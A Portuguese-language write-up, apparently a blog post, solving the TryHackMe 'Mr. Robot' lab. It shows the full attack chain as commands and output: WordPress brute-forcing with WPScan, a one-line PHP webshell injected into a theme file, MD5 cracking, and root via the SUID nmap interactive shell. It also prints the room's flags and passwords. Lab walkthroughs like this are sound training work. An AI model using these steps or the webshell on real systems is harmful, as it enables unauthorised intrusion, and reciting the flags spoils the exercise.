---
title: "TryHackMe — Mr. Robot Writeup"
description: "Resolução completa da sala Mr. Robot do TryHackMe: enumeração com Nmap e Gobuster, força bruta no WordPress com WPScan, webshell via tema, crack de MD5 e escalação de privilégio com SUID nmap."
pubDate: 2026-08-14
category: "Machine Write-ups"
tags: ["TryHackMe", "WordPress", "WPScan", "Webshell", "John", "SUID", "Linux PrivEsc"]
---

## Introdução

A sala **Mr. Robot** do TryHackMe é inspirada na série homônima e tem como objetivo encontrar **3 flags** escondidas em um servidor Linux rodando WordPress. O caminho passa por enumeração web, força bruta de credenciais, injeção de webshell e escalação de privilégio via binário SUID legado.

**Alvo:** `10.65.188.34`

---

## Resumo das Flags

| Flag | Hash |
|------|------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

Cadeia de exploração: `robots.txt` → força bruta no WordPress → webshell → crack de hash MD5 → SSH → SUID `nmap` → root.

---

## 1. Reconhecimento

### Scan de Portas

```bash
nmap -sV -sC -Pn 10.65.188.34
```

```text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache httpd
443/tcp  open  ssl/http Apache httpd
```

Servidor Apache rodando WordPress. SSH aberto na porta 22.

### Enumeração de Diretórios

```bash
gobuster dir -u http://10.65.188.34 -w /usr/share/wordlists/dirb/common.txt
```

Resultados relevantes:
- `/wp-admin`, `/wp-content`, `/wp-includes` → **WordPress**
- `/robots.txt` → presente e acessível

---

## 2. Key 1 — robots.txt

```bash
curl http://10.65.188.34/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

O `robots.txt` expõe dois arquivos diretamente: a primeira flag e uma wordlist customizada.

```bash
curl http://10.65.188.34/key-1-of-3.txt
```

**Key 1: `073403c8a58a1f80d943455fb30724b9`**

### Download e limpeza da wordlist

```bash
curl http://10.65.188.34/fsocity.dic -o fsocity.dic
wc -l fsocity.dic          # 858.160 linhas
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic     # 11.451 linhas
```

A wordlist tem muita repetição — deduplicar antes de usar economiza tempo no brute force.

---

## 3. Força Bruta no WordPress

### Enumerando o usuário

O formulário em `/wp-login.php` retorna mensagens de erro distintas para usuário inválido versus senha errada. Isso permite enumerar usuários válidos observando o tamanho da resposta HTTP.

Testando com WPScan:

```bash
wpscan --url http://10.65.188.34 --enumerate u
```

Usuário confirmado: **`elliot`**

### Quebrando a senha com WPScan

```bash
wpscan --url http://10.65.188.34 --usernames elliot --passwords fsocity_uniq.dic
```

```text
[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
```

Credenciais: `elliot : ER28-0652`

---

## 4. Webshell via Tema WordPress

Com acesso ao painel `/wp-admin`, navegamos até **Appearance → Theme Editor → 404.php** do tema ativo (**twentyfifteen**) e injetamos uma webshell simples:

```php
<?php system($_GET["c"]); ?>
```

Salvamos e testamos a execução:

```bash
curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=id'
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE confirmado como usuário `daemon`.

### Enumerando o diretório /home/robot

```bash
curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=ls+-la+/home/robot'
```

```text
-r-------- 1 robot robot   key-2-of-3.txt
-rw-r--r-- 1 robot robot   password.raw-md5
```

A flag 2 só pode ser lida pelo usuário `robot`. Mas o arquivo `password.raw-md5` é legível por todos:

```bash
curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=cat+/home/robot/password.raw-md5'
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

---

## 5. Crack do Hash MD5

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
abcdefghijklmnopqrstuvwxyz
```

**Senha do robot: `abcdefghijklmnopqrstuvwxyz`**

---

## 6. Key 2 — SSH como robot

```bash
ssh robot@10.65.188.34
# senha: abcdefghijklmnopqrstuvwxyz

cat key-2-of-3.txt
```

**Key 2: `822c73956184f694993bede3eb39f959`**

---

## 7. Key 3 — Escalação de Privilégio via SUID nmap

### Buscando binários SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/local/bin/nmap
```

O `nmap` versão 3.81 tem o bit SUID ativo — qualquer comando executado por ele herda permissões de **root**.

### Exploit: modo interativo do nmap

Versões antigas do nmap (< 5.x) possuem um modo interativo que permite executar comandos shell via `!`:

```bash
nmap --interactive
```

```text
nmap> !sh
# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

Shell root obtido. Coletando a flag final:

```bash
cat /root/key-3-of-3.txt
```

**Key 3: `04787ddef27c3dee1ee161b21670b4e4`**

---

## Conclusão

| # | Vetor | Flag |
|---|-------|------|
| 1 | `robots.txt` expondo arquivos sensíveis | `073403c8a58a1f80d943455fb30724b9` |
| 2 | Crack de MD5 → SSH como robot | `822c73956184f694993bede3eb39f959` |
| 3 | SUID `nmap --interactive` → root | `04787ddef27c3dee1ee161b21670b4e4` |

### Lições aprendidas

- **`robots.txt` não é segurança.** Nunca liste arquivos sensíveis ali — ele é público por definição.
- **WordPress com usuário enumerável + wordlist embutida no próprio servidor** é uma combinação fatal para força bruta.
- **Hashes MD5 sem sal** quebram trivialmente com `rockyou.txt`.
- **Binários SUID legados** são vetores clássicos de privesc — audite regularmente com `find / -perm -4000`.
